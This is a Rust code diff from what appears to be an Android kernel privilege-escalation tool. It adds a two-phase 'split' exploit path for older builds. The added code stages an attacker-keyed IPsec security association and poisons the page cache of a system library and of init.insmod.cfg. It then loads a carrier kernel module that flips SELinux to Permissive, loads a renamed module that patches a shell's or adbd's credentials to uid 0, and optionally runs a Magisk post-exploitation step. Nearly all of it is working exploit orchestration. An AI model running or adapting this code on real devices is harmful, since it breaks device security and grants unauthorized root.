@@ -8,7 +8,7 @@ use std::time::Duration;
 
 use crate::adb::{Adb, Stager, WaitShell, pick_device};
 use crate::assets;
-use crate::credmod::{build_carrier, build_cfg, build_credmod};
+use crate::credmod::{build_carrier, build_cfg, build_credmod, build_credmod_ex, rename_module};
 use crate::emit::{build_inject_stub, build_libas_stub, inject_restore_spec, libas_restore_spec};
 use crate::log::*;
 use crate::target::Target;
@@ -395,6 +395,14 @@ pub fn run_merged(t: &Target, device_override: Option<&str>, cleanup: Cleanup, _
     adb.push(&dex.to_string_lossy(), "/data/local/tmp/e2e.dex"); ok("pushed e2e.dex");
     disable_phantom(&adb);
 
+    // Old builds (e.g. Q2 4.19.157) have no daemon-mapped lib with a big-enough exec gap for the full
+    // merged cred stub. If the merged inject stub won't fit (or split_flow is set), take the split path:
+    // a small enforcing-only ctor -> Permissive, then a shell-direct renamed cred carrier -> root.
+    let adb_root_early = cleanup == Cleanup::AdbRoot;
+    if t.bool_or(&["split_flow"], false) || !merged_stub_fits(t, adb_root_early) {
+        return run_merged_split(t, &serial, &adb, cleanup, settle_ms, skip_magisk, local, &workdir);
+    }
+
     banner("STAGE  (shell: Dirty-Frag SA)");
     let mut stager = Stager::new(&serial, local);
     step(&format!("Staging attacker-keyed AES-GCM ESP SA ({})", t.s(&["dirtyfrag", "sa_spi"])));
@@ -561,6 +569,193 @@ pub fn run_merged(t: &Target, device_override: Option<&str>, cleanup: Cleanup, _
             if let Some(mut w) = wsh { w.stop(); }
             info("device is Permissive with a root-capable module loaded; run again with --postex/--adb-root.");
             warn("residue (needs reboot): carrier/cfg page-cache poison + loaded carrier module");
+        }
+    }
+}
+
+/// Would the full merged cred inject-stub fit the inject-lib's exec gap? (size only; pid irrelevant)
+fn merged_stub_fits(t: &Target, adb_root: bool) -> bool {
+    let cc = match std::fs::read(t.local_path(&["carrier", "local_ko"])) { Ok(b) => b, Err(_) => return true };
+    let (dsel, dfv, dpt, dssuse) = deltas(t);
+    let enf = t.hx_or(&["kernel", "enforcing_off"], 0) as u32;
+    let cred = t.hx_or(&["kernel", "cred_off"], 0x778) as u32;
+    let csec = if adb_root { t.hx_opt(&["kernel", "cred_security_off"]).map(|v| v as u32) } else { None };
+    let (credko, _) = match build_credmod(cc.clone(), dsel, dfv, dpt, 0, dssuse, enf, cred, csec) { Ok(x) => x, Err(_) => return true };
+    let shell_cfg = t.bool_or(&["cfg", "shell_poison_under_enforcing"], false);
+    let cfg_orig = match std::fs::read(t.local_path(&["cfg", "local_cfg"])) { Ok(b) => b, Err(_) => return true };
+    let (cfg_cur, cfg_want) = match build_cfg(cfg_orig, &t.s(&["carrier", "device_path"]), t.hx(&["cfg", "inject_off"]) as usize, t.hx(&["cfg", "inject_len"]) as usize) { Ok(x) => x, Err(_) => return true };
+    let ik = t.inj_key();
+    let mut files = vec![(t.s(&["carrier", "device_path"]), cc, credko)];
+    if !shell_cfg { files.push((t.s(&["cfg", "device_path"]), cfg_cur, cfg_want)); }
+    build_inject_stub(t.hx(&["dirtyfrag", "sa_spi"]) as u32, t.hx(&["dirtyfrag", "keymat_base"]) as u8, 9999,
+        t.hx(&[ik, "stub_gap_off"]) as u64, t.hx(&[ik, "stub_gap_size"]) as usize,
+        t.hx(&[ik, "orig_ctor_off"]) as u64, t.hx(&[ik, "init_array_off"]) as u64, &files).is_ok()
+}
+
+const SPLIT_CRED_MOD: &str = "rdbgcp";   // Phase-B module name (distinct from the loaded Phase-A carrier)
+
+// ============================== split merged flow (old builds: small ctor gap) ==============================
+// Phase A: inject a SMALL enforcing-only carrier via the tracking-daemon ctor -> Permissive.
+// Phase B: under Permissive/DAC, load a renamed FULL cred carrier via a shell-poisoned cfg -> root.
+// e2e.dex is already pushed and phantom disabled by the caller (run_merged).
+fn run_merged_split(t: &Target, serial: &str, adb: &Adb, cleanup: Cleanup, settle_ms: u64, skip_magisk: bool, local: bool, workdir: &Path) {
+    banner("SPLIT MERGED FLOW  (small enforcing ctor -> Permissive; then shell-direct cred carrier -> root)");
+    let adb_root = cleanup == Cleanup::AdbRoot;
+    let before = adb.sh("getenforce");
+    let ik = t.inj_key();
+    let (dsel, dfv, dpt, dssuse) = deltas(t);
+    let enf = t.hx_or(&["kernel", "enforcing_off"], 0) as u32;
+    let cred = t.hx_or(&["kernel", "cred_off"], 0x778) as u32;
+    let spi = t.hx(&["dirtyfrag", "sa_spi"]) as u32;
+    let kmb = t.hx(&["dirtyfrag", "keymat_base"]) as u8;
+    let shell_cfg = t.bool_or(&["cfg", "shell_poison_under_enforcing"], false);
+    let cc = read_local(&t.local_path(&["carrier", "local_ko"]));
+
+    banner("STAGE  (shell: Dirty-Frag SA)");
+    let mut stager = Stager::new(serial, local);
+    step(&format!("Staging attacker-keyed AES-GCM ESP SA ({})", t.s(&["dirtyfrag", "sa_spi"])));
+    let port = stager.start().unwrap_or_else(|| die("stager failed (stale SA? reboot to clear xfrm)"));
+    ok(&format!("SA live, encap port {}", port));
+
+    // ---------------- Phase A: enforcing-only carrier -> Permissive ----------------
+    banner("PHASE A  (enforcing-only carrier via ctor)");
+    step("Building enforcing-only carrier (build_credmod enforcing_only: enforcing=0 + status-sync)");
+    let (enfko, emsg) = build_credmod_ex(cc.clone(), dsel, dfv, dpt, 0, dssuse, enf, cred, None, true)
+        .unwrap_or_else(|e| { stager.stop(); die(&format!("build_credmod_ex: {}", e)) });
+    ok(&emsg);
+    let cfg_orig = read_local(&t.local_path(&["cfg", "local_cfg"]));
+    let (cfg_cur, cfg_want) = build_cfg(cfg_orig, &t.s(&["carrier", "device_path"]),
+        t.hx(&["cfg", "inject_off"]) as usize, t.hx(&["cfg", "inject_len"]) as usize).unwrap_or_else(|e| die(&e));
+
+    let mut inj_files = vec![(t.s(&["carrier", "device_path"]), cc.clone(), enfko)];
+    if !shell_cfg { inj_files.push((t.s(&["cfg", "device_path"]), cfg_cur.clone(), cfg_want.clone())); }
+    step(&format!("inject-lib stub  (init_array[0] -> {}-file enforcing poison in the gap)", inj_files.len()));
+    let (eva_raw, eva_spec, cnts) = build_inject_stub(spi, kmb, port,
+        t.hx(&[ik, "stub_gap_off"]) as u64, t.hx(&[ik, "stub_gap_size"]) as usize,
+        t.hx(&[ik, "orig_ctor_off"]) as u64, t.hx(&[ik, "init_array_off"]) as u64, &inj_files)
+        .unwrap_or_else(|e| { stager.stop(); die(&format!("Phase-A inject stub: {}", e)) });
+    let eva_stub_len = eva_raw.len();
+    info(&format!("stub {}B (IVs={:?}) gap fits {}B", eva_raw.len(), cnts, t.hx(&[ik, "stub_gap_size"])));
+    poison(adb, workdir, &inj_dev_path(t), &eva_spec, "inject");
+    step(&format!("libandroid_servers::dump stub  (-> ctl.restart {})", t.s(&["services", "tracking"])));
+    let (las_raw, las_spec) = build_libas_stub(&t.s(&["property_socket"]), &t.s(&["services", "tracking"]),
+        t.hx(&["libandroid_servers", "dump_off"]) as u64, t.hx(&["libandroid_servers", "dump_size"]) as usize).unwrap_or_else(|e| die(&e));
+    let orig_las = adb.read_region(&t.s(&["libandroid_servers", "device_path"]), t.hx(&["libandroid_servers", "dump_off"]) as u64, las_raw.len());
+    poison(adb, workdir, &t.s(&["libandroid_servers", "device_path"]), &las_spec, "libas");
+
+    let mut reverted = false;
+    let do_revert = |adb: &Adb, workdir: &Path, reverted: &mut bool| {
+        if *reverted { return; } *reverted = true;
+        poison(adb, workdir, &inj_dev_path(t), &inject_restore_spec(t.hx(&[ik, "stub_gap_off"]) as u64, t.hx(&[ik, "init_array_off"]) as u64, t.hx(&[ik, "orig_ctor_off"]) as u64, eva_stub_len), "inject_restore");
+        if !orig_las.is_empty() {
+            poison(adb, workdir, &t.s(&["libandroid_servers", "device_path"]), &libas_restore_spec(t.hx(&["libandroid_servers", "dump_off"]) as u64, &orig_las), "libas_restore");
+        }
+    };
+
+    banner("TRIGGER  (shell)");
+    let tsvc = t.s(&["services", "tracking"]);
+    let isvc = t.s(&["services", "insmod_sh"]);
+    step(&format!("dumpsys input  ->  system_server restarts {}  ->  ctor poisons carrier", tsvc));
+    let pid0 = adb.sh(&format!("pidof {}", tsvc));
+    adb.sh("dumpsys input >/dev/null 2>&1");
+    let mut pid1 = pid0.clone();
+    for _ in 0..200 { ms(100); pid1 = adb.sh(&format!("pidof {}", tsvc)); if !pid1.is_empty() && pid1 != pid0 { break; } }
+    if pid1 == pid0 || pid1.is_empty() {
+        err(&format!("{} did not restart (pid still {}) — dump stub not hit", tsvc, pid0));
+        do_revert(adb, workdir, &mut reverted); stager.stop(); return;
+    }
+    ok(&format!("{} restarted  pid {} -> {}", tsvc, pid0, pid1));
+    info(&format!("settling {}ms for the ctor's carrier poison to complete", settle_ms));
+    ms(settle_ms);
+    step("Reverting inject-lib + libandroid poison (ctor done; before module load)");
+    do_revert(adb, workdir, &mut reverted);
+
+    if shell_cfg {
+        step("init.insmod.cfg  (shell-direct: insmod the enforcing carrier)");
+        adb.sh(&format!("cat {} >/dev/null 2>&1", t.s(&["cfg", "device_path"])));
+        poison(adb, workdir, &t.s(&["cfg", "device_path"]), &cfg_pe_spec(t, &t.s(&["carrier", "device_path"])), "cfg");
+    } else {
+        info("init.insmod.cfg was poisoned by the 2-file ctor");
+    }
+    step(&format!("setprop ctl.start {}  ->  init finit_modules the enforcing carrier", isvc));
+    adb.sh(&format!("setprop ctl.start {}", isvc));
+
+    banner("VERIFY  (enforcing flip)");
+    let mut after = String::new();
+    for _ in 0..100 { ms(100); after = adb.sh("getenforce"); if after == "Permissive" { break; } }
+    if after != "Permissive" {
+        err(&format!("getenforce={} (expected Permissive) — Phase-A carrier load failed", after));
+        stager.stop();
+        warn("if the DEVICE crashed, grab the panic log once it is back:");
+        warn("  su -c 'cat /sys/fs/pstore/console-ramoops-0 /sys/fs/pstore/dmesg-ramoops-0 2>/dev/null'");
+        return;
+    }
+    win(&format!("SELinux {} -> {}   (zero root)", before, after));
+    stager.stop(); ok("stager stopped (SA reaped) — Phase B is shell-direct under DAC");
+
+    // ---------------- Phase B: renamed cred carrier via shell-poisoned cfg -> root ----------------
+    banner("PHASE B  (cred carrier via shell, under Permissive)");
+    let pid: i64;
+    let mut wsh: Option<WaitShell> = None;
+    if adb_root {
+        let p = adbd_pid(adb).unwrap_or_else(|| die("could not find adbd pid"));
+        step(&format!("Target: adbd pid {} (cred-patch -> uid0 + all caps + kernel context)", p));
+        pid = p.parse().unwrap_or(0);
+    } else {
+        step("Launching waiting shell (to be cred-patched to uid 0)");
+        let mut w = WaitShell::new(serial, local, skip_magisk, &format!("{} {}", mod_name(&t.s(&["carrier", "device_path"])), SPLIT_CRED_MOD));
+        let p = w.start().unwrap_or_else(|| die("waiting shell failed"));
+        ok(&format!("waiting shell pid {}", p));
+        pid = p; wsh = Some(w);
+    }
+    step(&format!("Building FULL cred carrier (rename module -> '{}', coexists with loaded carrier)", SPLIT_CRED_MOD));
+    let (credko, cmsg) = build_cred(t, cc.clone(), pid, adb_root);
+    info(&cmsg);
+    let credko = rename_module(credko, SPLIT_CRED_MOD).unwrap_or_else(|e| die(&format!("rename_module: {}", e)));
+    push_bytes(adb, workdir, "uv.ko", &credko, "/data/local/tmp/uv.ko");
+    if !adb_root { stage_postex_assets(adb, workdir); }
+    step("Poisoning init.insmod.cfg -> insmod uv.ko (shell, permissive)");
+    poison_cfg_direct(t, adb, workdir, "/data/local/tmp/uv.ko");
+    step(&format!("setprop ctl.start {} -> loads uv.ko -> cred-patch", isvc));
+    adb.sh(&format!("setprop ctl.start {}", isvc));
+
+    let mut rooted = false; let mut uline = String::new();
+    for _ in 0..30 {
+        secs(1);
+        if adb_root { let ul = adb.sh(&format!("grep -m1 Uid /proc/{}/status 2>/dev/null", pid)); if ul.split_whitespace().nth(1) == Some("0") { rooted = true; break; } }
+        else if let Some(w) = &wsh { uline = adb.sh(&format!("grep -m1 Uid /proc/{}/status 2>/dev/null", w.pid.unwrap_or(0))); if uline.split_whitespace().nth(1) == Some("0") { rooted = true; break; } }
+    }
+    if !rooted {
+        if let Some(mut w) = wsh { w.stop(); }
+        die(&format!("cred carrier load did not root the target (uv.ko failed?) — {}", if uline.is_empty() { "no Uid line".into() } else { uline }));
+    }
+
+    banner("RESULT");
+    if adb_root {
+        win(&format!("adbd (pid {}) cred-patched -> NEW adb shells are uid 0 + all caps + kernel context", pid));
+        info("Open a NEW adb shell to get full root:   adb shell   ->   id  (uid=0)");
+        warn("residue (needs reboot): carrier page-cache poison + 2 loaded modules (rdbg + rdbgcp, exit neutralized)");
+        return;
+    }
+    win(&format!("waiting shell {} cred-patched -> uid 0", pid));
+    match cleanup {
+        Cleanup::Postex => {
+            let mut w = wsh.take().unwrap();
+            banner("POST-EX  (root shell -> Magisk)");
+            step("Releasing rooted shell -> postex.sh (drop_caches, rmmod, Magisk, setenforce 1)");
+            w.release();
+            for _ in 0..90 { if adb.sh("[ -f /data/local/tmp/postex_done ] && echo y") == "y" { break; } secs(2); }
+            w.stop();
+            banner("POST-EX RESULT");
+            let logtxt = adb.sh("cat /data/local/tmp/postex.log 2>/dev/null");
+            println!("{}", if logtxt.is_empty() { "(no log)".into() } else { logtxt });
+            let ge = adb.sh("getenforce");
+            if ge == "Enforcing" { win(&format!("final getenforce={}  (Magisk policy live if Enforcing)", ge)); } else { warn(&format!("final getenforce={}", ge)); }
+        }
+        _ => {
+            if let Some(mut w) = wsh { w.stop(); }
+            info("device is Permissive with a root-capable module loaded; run again with --postex/--adb-root.");
+            warn("residue (needs reboot): carrier/cfg page-cache poison + 2 loaded modules (rdbg + rdbgcp)");
         }
     }
 }
